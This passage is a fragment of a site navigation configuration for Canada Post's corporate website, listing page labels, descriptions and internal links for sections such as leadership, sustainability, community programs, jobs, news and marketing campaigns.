                  "nodes": [
                    
              
                {
                  "label": "About us",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                   "queryString": "About us overview",
                 
                    "description": "Learn about our management team and corporate initiatives.",
                  
                    "link": "/cpc/en/our-company/about-us.page?",
                    "linkCMSPage": "our-company/about-us",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Our leadership",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about our leadership behaviours and teams.",
                  
                    "link": "/cpc/en/our-company/about-us/our-leadership.page?",
                    "linkCMSPage": "our-company/about-us/our-leadership",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Senior management team",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn about the members of our senior management team.",
                  
                    "link": "/cpc/en/our-company/about-us/our-leadership/senior-management-team.page?",
                    "linkCMSPage": "our-company/about-us/our-leadership/senior-management-team",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Corporate governance",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about the Board of Directors, our principles and policies.",
                  
                    "link": "/cpc/en/our-company/about-us/our-leadership/corporate-governance.page?",
                    "linkCMSPage": "our-company/about-us/our-leadership/corporate-governance",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Role of the Board",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/about-us/our-leadership/corporate-governance/role-of-the-board.page?",
                    "linkCMSPage": "our-company/about-us/our-leadership/corporate-governance/role-of-the-board",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Directors' biographies",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/about-us/our-leadership/corporate-governance/directors-biographies.page?",
                    "linkCMSPage": "our-company/about-us/our-leadership/corporate-governance/directors-biographies",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Directors' committees",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/about-us/our-leadership/corporate-governance/directors-committees.page?",
                    "linkCMSPage": "our-company/about-us/our-leadership/corporate-governance/directors-committees",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Board diversity",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/about-us/our-leadership/corporate-governance/diversity-on-our-board.page?",
                    "linkCMSPage": "our-company/about-us/our-leadership/corporate-governance/diversity-on-our-board",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Travel and hospitality policy",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about the Board and senior management members spending policy.",
                  
                    "link": "/cpc/en/our-company/about-us/our-leadership/travel-and-hospitality-policy.page?",
                    "linkCMSPage": "our-company/about-us/our-leadership/travel-and-hospitality-policy",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Travel and hospitality expenses",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/about-us/our-leadership/travel-and-hospitality-policy/travel-and-hospitality-expenses.page?",
                    "linkCMSPage": "our-company/about-us/our-leadership/travel-and-hospitality-policy/travel-and-hospitality-expenses",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
                  ]
                },
              
              
                {
                  "label": "Corporate sustainability",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about how we support communities, employees and the environment.",
                  
                    "link": "/cpc/en/our-company/about-us/corporate-sustainability.page?",
                    "linkCMSPage": "our-company/about-us/corporate-sustainability",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Environmental responsibility",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn about our sustainability and conservation efforts.",
                  
                    "link": "/cpc/en/our-company/about-us/corporate-sustainability/environment-responsibility.page?",
                    "linkCMSPage": "our-company/about-us/corporate-sustainability/environment-responsibility",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Accessibility",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about how we’re improving the accessibility of our services.",
                  
                    "link": "/cpc/en/our-company/about-us/corporate-responsibility/accessibility.page?",
                    "linkCMSPage": "our-company/about-us/corporate-responsibility/accessibility",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Digital accessibility",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/about-us/corporate-responsibility/accessibility/digital-accessibility.page?",
                    "linkCMSPage": "our-company/about-us/corporate-responsibility/accessibility/digital-accessibility",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Delivery accommodation program",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/about-us/corporate-responsibility/accessibility/delivery-accommodation-program.page?",
                    "linkCMSPage": "our-company/about-us/corporate-responsibility/accessibility/delivery-accommodation-program",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Accessibility advisory panel",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/about-us/corporate-responsibility/accessibility/advisory-panel.page?",
                    "linkCMSPage": "our-company/about-us/corporate-responsibility/accessibility/advisory-panel",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Archived corporate reports",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Access past corporate responsibility reports.",
                  
                    "link": "/cpc/en/our-company/about-us/corporate-responsibility/archived-corporate-reports.page?",
                    "linkCMSPage": "our-company/about-us/corporate-responsibility/archived-corporate-reports",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Indigenous and Northern reconciliation",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn about how we’re improving our work with Indigenous communities.",
                  
                    "link": "/cpc/en/our-company/about-us/corporate-sustainability/indigenous-reconciliation.page?",
                    "linkCMSPage": "our-company/about-us/corporate-sustainability/indigenous-reconciliation",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Transparency and trust",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about how we protect your information and keep you informed. ",
                  
                    "link": "/cpc/en/our-company/about-us/transparency-and-trust.page?",
                    "linkCMSPage": "our-company/about-us/transparency-and-trust",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Privacy centre",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn about our privacy practices and access the Privacy Policy.",
                  
                    "link": "/cpc/en/our-company/about-us/transparency-and-trust/privacy-centre.page?",
                    "linkCMSPage": "our-company/about-us/transparency-and-trust/privacy-centre",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Access to information",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/about-us/transparency-and-trust/access-to-information.page?",
                    "linkCMSPage": "our-company/about-us/transparency-and-trust/access-to-information",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Legislation and regulations",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Access the Canada Post Corporation Act.",
                  
                    "link": "/cpc/en/our-company/about-us/legislation-and-regulations.page?",
                    "linkCMSPage": "our-company/about-us/legislation-and-regulations",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Financial reports",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "View our annual reports and quarterly financial reports.",
                  
                    "link": "/cpc/en/our-company/about-us/financial-reports.page?",
                    "linkCMSPage": "our-company/about-us/financial-reports",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Quarterly financial reports",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Access current and archived quarterly financial reports.",
                  
                    "link": "/cpc/en/our-company/about-us/financial-reports/quarterly-financial-reports.page?",
                    "linkCMSPage": "our-company/about-us/financial-reports/quarterly-financial-reports",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "2021 Annual report",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Access the most recent Annual report.",
                  
                    "link": "/cpc/en/our-company/about-us/financial-reports/2021-annual-report/a-stronger-canada.page?",
                    "linkCMSPage": "our-company/about-us/financial-reports/2021-annual-report/a-stronger-canada",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
                  ]
                },
              
              
                {
                  "label": "Giving back to our communities",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                   "queryString": "Giving back to our communities overview",
                 
                    "description": "Learn about grants, awards and access children’s activities.",
                  
                    "link": "/cpc/en/our-company/giving-back-to-our-communities.page?",
                    "linkCMSPage": "our-company/giving-back-to-our-communities",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Canada Post Community Foundation",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about Foundation grants for schools, charities and organizations.",
                  
                    "link": "/cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation.page?",
                    "linkCMSPage": "our-company/giving-back-to-our-communities/canada-post-community-foundation",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Community Foundation application",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn how to apply for a Community Foundation grant.",
                  
                    "link": "/cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-application.page?",
                    "linkCMSPage": "our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-application",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Community Foundation trustees",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn about the trustees and advisors that award Foundation grants.",
                  
                    "link": "/cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-trustees.page?",
                    "linkCMSPage": "our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-trustees",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Community Foundation grant recipients",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Browse past community projects that have received grants.",
                  
                    "link": "/cpc/en/our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-grant-recipients.page?",
                    "linkCMSPage": "our-company/giving-back-to-our-communities/canada-post-community-foundation/community-foundation-grant-recipients",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Canada Post Awards for Indigenous Students ",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about education grants for Indigenous Peoples.",
                  
                    "link": "/cpc/en/our-company/giving-back-to-our-communities/canada-post-awards-for-indigenous-students.page?",
                    "linkCMSPage": "our-company/giving-back-to-our-communities/canada-post-awards-for-indigenous-students",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Education award recipients",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Browse a list of past Indigenous Student award winners.",
                  
                    "link": "/cpc/en/our-company/giving-back-to-our-communities/canada-post-awards-for-indigenous-students/education-award-recipients.page?",
                    "linkCMSPage": "our-company/giving-back-to-our-communities/canada-post-awards-for-indigenous-students/education-award-recipients",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Write a letter to Santa",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Send a letter to the North Pole and get tips for parents and teachers.",
                  
                    "link": "/cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa.page?",
                    "linkCMSPage": "our-company/giving-back-to-our-communities/write-a-letter-to-santa",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Santa letter tips for parents",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Get letter templates and tips for writing to the North Pole.",
                  
                    "link": "/cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa/santa-program-for-parents.page?",
                    "linkCMSPage": "our-company/giving-back-to-our-communities/write-a-letter-to-santa/santa-program-for-parents",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Santa letter tips for teachers",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Get information on sending a class letter to Santa.",
                  
                    "link": "/cpc/en/our-company/giving-back-to-our-communities/write-a-letter-to-santa/santa-program-for-teachers.page?",
                    "linkCMSPage": "our-company/giving-back-to-our-communities/write-a-letter-to-santa/santa-program-for-teachers",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Kids postal service activities",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Download printable mail templates and activity sheets.",
                  
                    "link": "/cpc/en/our-company/giving-back-to-our-communities/kids-postal-service-activities.page?",
                    "linkCMSPage": "our-company/giving-back-to-our-communities/kids-postal-service-activities",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Jobs",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                   "queryString": "Jobs overview",
                 
                    "description": "View available job opportunities.",
                  
                    "link": "/cpc/en/our-company/jobs.page?",
                    "linkCMSPage": "our-company/jobs",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Apply for current opportunities",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Browse available jobs at Canada Post.",
                  
                    "link": "https://jobs.canadapost.ca/go/Canada-Post-All-Current-Opportunities/2319117/",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Business opportunities",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                   "queryString": "Business opportunities overview",
                 
                    "description": "Learn about bids for contract work and retail partnerships.",
                  
                    "link": "/cpc/en/our-company/business-opportunities.page?",
                    "linkCMSPage": "our-company/business-opportunities",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Contract work for your business",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Partner with us and bid on contracts for your business.",
                  
                    "link": "/cpc/en/our-company/business-opportunities/contracts-for-your-business.page?",
                    "linkCMSPage": "our-company/business-opportunities/contracts-for-your-business",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Goods and services contracts",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Browse and bid on goods and services contracts.",
                  
                    "link": "/cpc/en/our-company/business-opportunities/contracts-for-your-business/goods-and-services-contracts.page?",
                    "linkCMSPage": "our-company/business-opportunities/contracts-for-your-business/goods-and-services-contracts",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Transportation contracts",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Bid on air and ground transportation contracts.",
                  
                    "link": "/cpc/en/our-company/business-opportunities/contracts-for-your-business/transportation-contracts.page?",
                    "linkCMSPage": "our-company/business-opportunities/contracts-for-your-business/transportation-contracts",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Become an authorized retail partner",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Offer post office products and services from your business.",
                  
                    "link": "/cpc/en/our-company/business-opportunities/become-an-authorized-retailer.page?",
                    "linkCMSPage": "our-company/business-opportunities/become-an-authorized-retailer",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "News and media",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                   "queryString": "News and media overview",
                 
                    "description": "Access mailing service updates and images for media.",
                  
                    "link": "/cpc/en/our-company/news-and-media.page?",
                    "linkCMSPage": "our-company/news-and-media",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Service alerts",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Updated details on mail delivery interruptions.",
                  
                    "link": "/cpc/en/our-company/news-and-media/service-alerts.page?",
                    "linkCMSPage": "our-company/news-and-media/service-alerts",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Service alerts archive ",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Browse past service alerts.",
                  
                    "link": "/cpc/en/our-company/news-and-media/service-alerts/service-alerts-archive.page?",
                    "linkCMSPage": "our-company/news-and-media/service-alerts/service-alerts-archive",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Corporate news",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Access news releases and company updates.",
                  
                    "link": "/cpc/en/our-company/news-and-media/corporate-news.page?",
                    "linkCMSPage": "our-company/news-and-media/corporate-news",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "News releases",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Browse our most recent and past news releases.",
                  
                    "link": "/cpc/en/our-company/news-and-media/corporate-news/news-release-list.page?",
                    "linkCMSPage": "our-company/news-and-media/corporate-news/news-release-list",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Closures and service interruptions",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Learn about weather events and holiday hours impacting delivery.",
                  
                    "link": "/cpc/en/our-company/news-and-media/corporate-news/closures-and-service-interruptions-list.page?",
                    "linkCMSPage": "our-company/news-and-media/corporate-news/closures-and-service-interruptions-list",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Negotiations updates",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Get information on negotiations with our unions.",
                  
                    "link": "/cpc/en/our-company/news-and-media/corporate-news/negotiations-list.page?",
                    "linkCMSPage": "our-company/news-and-media/corporate-news/negotiations-list",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "COVID-19 updates",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Learn about impacts to sending amid COVID-19.",
                  
                    "link": "/cpc/en/our-company/news-and-media/corporate-news/coronavirus-disease-covid-19.page?",
                    "linkCMSPage": "our-company/news-and-media/corporate-news/coronavirus-disease-covid-19",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "COVID-19 frequently asked questions ",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/our-company/news-and-media/corporate-news/coronavirus-disease-covid-19/coronavirus-disease-covid-19-faq.page?",
                    "linkCMSPage": "our-company/news-and-media/corporate-news/coronavirus-disease-covid-19/coronavirus-disease-covid-19-faq",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
                  ]
                },
              
              
                {
                  "label": "Media centre",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "description": "Access official company images, logos and videos.",
                  
                    "link": "/cpc/en/our-company/news-and-media/media-centre.page?",
                    "linkCMSPage": "our-company/news-and-media/media-centre",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Photo gallery",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Browse and download official company images.",
                  
                    "link": "/cpc/en/our-company/news-and-media/media-centre/photo-gallery.page?",
                    "linkCMSPage": "our-company/news-and-media/media-centre/photo-gallery",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "B-roll footage",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "View and download B-roll footage of our facilities and products.",
                  
                    "link": "/cpc/en/our-company/news-and-media/media-centre/b-roll-footage.page?",
                    "linkCMSPage": "our-company/news-and-media/media-centre/b-roll-footage",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Canada Post logos",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "description": "Access our company logo and guidelines on how it should be applied.",
                  
                    "link": "/cpc/en/our-company/news-and-media/media-centre/canada-post-logos.page?",
                    "linkCMSPage": "our-company/news-and-media/media-centre/canada-post-logos",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
                  ]
                },
              
                  ]
                },
              
              
                {
                  "label": "Campaign",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "false",
                 "preserveQs": "false",
                 
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Ecommerce-hub",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "false",
                 "preserveQs": "false",
                 
                    "link": "/cpc/en/business/marketing/campaign/ecommerce-hub.page?",
                    "linkCMSPage": "business/marketing/campaign/ecommerce-hub",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Being a leader",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/ecommerce-hub/being-a-leader.page?",
                    "linkCMSPage": "business/marketing/campaign/ecommerce-hub/being-a-leader",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Scaling up",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/ecommerce-hub/scaling-up.page?",
                    "linkCMSPage": "business/marketing/campaign/ecommerce-hub/scaling-up",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Inspiring stories",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/ecommerce-hub/inspiring-stories.page?",
                    "linkCMSPage": "business/marketing/campaign/ecommerce-hub/inspiring-stories",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Best practices",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/ecommerce-hub/best-practices.page?",
                    "linkCMSPage": "business/marketing/campaign/ecommerce-hub/best-practices",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Insider",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/ecommerce-hub/ecommerce-insider.page?",
                    "linkCMSPage": "business/marketing/campaign/ecommerce-hub/ecommerce-insider",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Direct-mail-smm",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "false",
                 "preserveQs": "false",
                 
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Get Noticed",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "#",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Get results",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "#",
                  
                    "preserveQs": "true",
                  
                },
              
              
                {
                  "label": "Get Inspired",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "#",
                  
                    "preserveQs": "true",
                  
                },
              
              
                {
                  "label": "Get help",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "#",
                  
                    "preserveQs": "true",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Tales-of-triumph",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "false",
                 "preserveQs": "false",
                 
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Details",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Categories and prizes",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/tales-of-triumph/details/categories-and-prizes.page",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Application process and key dates",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/tales-of-triumph/details/application-process-key-dates.page",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Judges",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/tales-of-triumph/details/meet-the-judges.page",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Finalists",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/tales-of-triumph/details/meet-the-finalists.page",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "2021 winners",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/tales-of-triumph/details/2021-winners.page",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "2020 winners",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/tales-of-triumph/details/2020-winners.page",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "FAQs",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/tales-of-triumph/faq.page",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Terms and conditions",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/tales-of-triumph/terms-and-conditions.page",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Ecommerce-infographic",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Downloads",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Get Market Insights infographic",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/doc/en/campaigns/2021/ecommerce-infographic/marketing-insights-infographic.pdf?icid=cta_int_bc_1695_tlael",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Shipping Report",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/info/mc/app/personal/miniforms/shippingguide.jsf",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Curbside Pickup Guide",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/info/mc/app/personal/miniforms/curbsidepickup.jsf",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Shopper Journey Report",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/info/mc/app/personal/miniforms/ecommerce-report.jsf",
                  
                    "target": "_blank",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
                  ]
                },
              
              
                {
                  "label": "Small-business-welcome",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
